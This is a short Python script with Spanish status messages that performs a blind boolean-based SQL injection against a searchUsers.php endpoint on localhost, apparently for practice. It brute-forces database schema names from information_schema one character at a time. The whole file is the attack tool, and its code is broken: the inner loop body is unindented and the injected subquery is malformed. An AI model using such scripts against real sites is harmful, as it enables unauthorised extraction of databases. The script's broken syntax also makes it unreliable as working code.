#!/usr/bin/python3

import requests 
import signal 
import sys 
import time
import string
from pwn import *

def def_handler(sig,frame):
    print("\n[!] Saliendo..\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():
    
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extreacted_info = ""

    for position in range(1, 150):
        for character in range(33, 126):
        sqli_url = main_url + "?id=9 or (select(select ascii(substring(select group_concat(schema_name) from information_schema.schemata,%d,1)) from users where id = 1)=%d)" % (position, character)
        
        p1.status(sqli_url)

        r = requests.get(sqli_url)

        if r.status_code == 200:
            extreacted_info += chr(character)
            p2.status(extreacted_info)
            break

if __name__ == "__main__":
    
    makeSQLI()
